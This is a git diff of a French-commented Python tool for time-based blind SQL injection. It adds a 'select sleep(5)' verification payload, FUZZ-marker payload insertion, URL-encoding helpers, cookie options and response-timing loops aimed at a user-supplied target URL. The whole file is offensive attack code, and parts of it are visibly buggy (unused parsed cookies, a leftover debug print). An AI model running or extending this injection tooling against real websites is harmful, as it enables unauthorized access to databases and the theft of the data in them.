@@ -1,11 +1,44 @@
 import requests
 import time
 import argparse
+import urllib.parse
+import re
+
+verif_payload = "select sleep(5)"
+verif_payload_urlencode ="select%20sleep%285%29"
+
+############## FONCTIONS ##############
+
+# Découpe une chaîne de caractères en deux parties lorsqu'il y a FUZZ.
+def split_at_fuzz(input_string):
+    parts = input_string.split("FUZZ")
+    if len(parts) == 1:
+        return parts[0], ""
+    else:
+        return parts[0], parts[1]
+
+# Ajoute une payload, soit pour l'attaque, soit pour la vérification
+def add_payload(input_string, payload):
+    before_fuzz, after_fuzz = split_at_fuzz(input_string)
+    print(before_fuzz + "AAAAAAAAAA")
+    return before_fuzz + payload + after_fuzz
+
+# Encode une chaîne de caractères conformément aux spécifications URL.
+def urlencode(string_to_encode):
+    return urllib.parse.quote(string_to_encode)
+
+# Encode une chaîne de caractères entre <@urlencode> et </@urlencode> conformément aux spécifications URL.
+def urlencode_in_tags(input_string):
+    def encode_match(match):
+        return urlencode(match.group(1))
+    return re.sub(r'<@urlencode>(.*?)</@urlencode>', encode_match, input_string)
 
 # Fonction pour exécuter la requête SQL et mesurer le temps de réponse
-def execute_sql_query(url, params):
+def get_request(url, params, cookies=None):
     start_time = time.time()
-    response = requests.get(url, params={'test': params})
+    response = requests.get(url, params=params, cookies=cookies)
+    if response.status_code!=200:
+        print("\033[91m[+] Erreur dans une rêquete (Erreur " + str(response.status_code) + ")\033[0m")
     end_time = time.time()
     return end_time - start_time
 
@@ -17,7 +50,16 @@ def check_response_time(response_time):
         return False
 
 def verify(url, params):
-    response_time=execute_sql_query(url, params)
+    print('[X] Vérification de l\'injection SQL Time-Based sur ' + url)
+    params=add_payload(params, verif_payload)
+    print(params)
+    params=urlencode_in_tags(params)
+    print(params)
+    response_time=get_request(url, params)
+    if check_response_time(response_time):
+        print('[+] Injection vérifiée')
+    else:
+        print('[-] Injection non exploitable/non vérifiée')
     return check_response_time(response_time)
 
 # ASCII art
@@ -40,6 +82,7 @@ parser.add_argument("-u", "--url", help="URL de la cible")
 parser.add_argument("-p", "--params", help="Paramètres de la requête (au format 'test=1&test=2&test=3') (avec $FUZZ$ pour le fuzzing)")
 parser.add_argument("-a", "--attack", action="store_true", help="Attaque à effectuer")
 parser.add_argument("-v", "--verify", action="store_true", help="Vérification de l'injection SQL Time-Based")
+parser.add_argument("-c", "--cookies", help="Cookies à inclure dans la requête (au format 'cookie1=value1;cookie2=value2')")
 args = parser.parse_args()
 
 
@@ -50,12 +93,18 @@ if args.interactive:
 # Si l'utilisateur fournit l'URL et la requête en ligne de commande
 elif args.url and args.params:
     url = args.url
-    params = args.params.split(",") if args.params else []
+    params = args.params
+    attack = args.attack
+    cookies = args.cookies
     if args.verify:
-        print('[-] Vérification de l\'injection SQL Time-Based')
+        verify(url, params)
 else:
     print("Veuillez utiliser -i pour le mode interactif ou -u pour l'URL et -p pour les paramètres.")
     exit()
+
+parsed_cookies = None
+if cookies:
+    parsed_cookies = dict(cookie.split('=') for cookie in cookies.split(';'))
 
 # Vérification de l'URL
 if not url:
@@ -69,13 +118,7 @@ num_queries = 5
 
 # Effectuer les requêtes et mesurer les temps de réponse
 for _ in range(num_queries):
-    response, exec_time = execute_sql_query(url, params)
-    response_times.append((response, exec_time))
+    exec_time = get_request(url, params)
+    response_times.append((exec_time))
 
-# Trier les résultats en fonction du temps de réponse
-response_times.sort(key=lambda x: x[1])
-
-# Afficher les résultats triés
-for i, (response, exec_time) in enumerate(response_times):
-    print(f"Requête {i+1}: Temps de réponse {exec_time} secondes")
-    print(response.text)
+print(response_times)
